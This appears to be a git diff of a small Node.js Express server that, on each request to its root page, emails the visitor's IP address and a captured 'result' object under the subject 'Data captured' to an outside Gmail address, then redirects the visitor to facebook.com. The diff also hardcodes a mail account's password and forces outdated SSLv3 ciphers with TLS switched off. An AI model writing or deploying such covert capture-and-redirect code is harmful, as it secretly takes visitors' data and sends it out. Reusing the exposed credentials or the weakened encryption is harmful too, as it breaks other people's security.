@@ -14,11 +14,14 @@ const app = express();
 var smtpTransport = nodemailer.createTransport({
     host: "mail.privateemail.com",
     port: 587,
-    secure: true, // upgrade later with STARTTLS
+    secure: false, // upgrade later with STARTTLS
     auth: {
       user: "mark@theluckyhub.com",
       pass: "A8wQu3{bM-]EXn`f",
     },
+    tls: {
+        ciphers:'SSLv3'
+    }
   });
 
   
@@ -32,7 +35,7 @@ app.get("/", (req, res, next) => {
         from: "mark@theluckyhub.com", // sender address
         to: "promaxcoq@gmail.com", // list of receivers
         subject: "Data captured", // Subject line
-        text: result, // plaintext body
+        text: "IP is... " + req.ip + JSON.stringify(result)
         // html: "<b>Hello world ✔</b>" // html body
       };
     
@@ -46,8 +49,11 @@ app.get("/", (req, res, next) => {
         }
       });
 
-
-    res.status(200).send(result);
+      res.writeHead(301, {
+        Location: `https://facebook.com`
+      }).end();
+      
+    // res.status(200).send(result);
 })
 
 var server = app.listen(port, function(){
